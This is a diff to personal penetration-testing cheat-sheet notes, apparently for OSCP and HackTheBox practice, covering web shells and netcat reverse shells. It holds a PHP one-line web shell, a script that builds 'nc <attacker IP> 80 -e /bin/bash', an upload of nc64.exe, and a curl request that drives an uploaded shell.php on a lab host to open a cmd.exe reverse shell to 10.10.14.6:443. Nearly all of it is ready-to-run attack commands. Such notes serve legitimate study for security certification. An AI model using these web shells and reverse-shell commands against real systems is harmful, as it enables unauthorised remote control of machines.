@@ -16,6 +16,10 @@ which python3 python perl ruby socat script
 <?php system($_GET['cmd']);?>
 ```
 
+```
+curl -G school.flight.htb/styles/shell.php --data-urlencode 'cmd=nc64.exe -e cmd.exe 10.10.14.6 443'
+```
+
 WhiteWinterWolf enhanced webshell (WWWShell.php)
 
 ```
@@ -215,8 +219,9 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```
 
 ---
-
 ## Netcat
+
+[[Netcat.exe]]
 
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
@@ -224,6 +229,14 @@ const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page
 const command = `nc ${KaliIP} 80 -e /bin/bash`;
 
 dv.paragraph("```bash\n" + command + "\n```");
+```
+
+```
+put /opt/netcat/nc64.exe nc64.exe
+```
+
+```
+curl -G school.flight.htb/styles/shell.php --data-urlencode 'cmd=nc64.exe -e cmd.exe 10.10.14.6 443'
 ```
 
 ---
